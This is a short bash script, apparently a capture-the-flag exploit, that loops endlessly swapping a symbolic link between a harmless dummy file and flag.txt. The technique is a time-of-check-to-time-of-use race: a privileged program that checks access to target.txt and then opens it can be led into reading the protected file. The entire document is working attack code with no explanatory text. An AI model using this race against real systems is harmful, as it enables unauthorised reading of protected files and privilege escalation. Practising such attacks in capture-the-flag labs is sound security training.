#!/bin/bash

while true; do
    # Point the symbolic link to a file you have access to
    ln -sf dummy.txt target.txt
    # Point the symbolic link to the file you want to read
    ln -sf flag.txt target.txt
done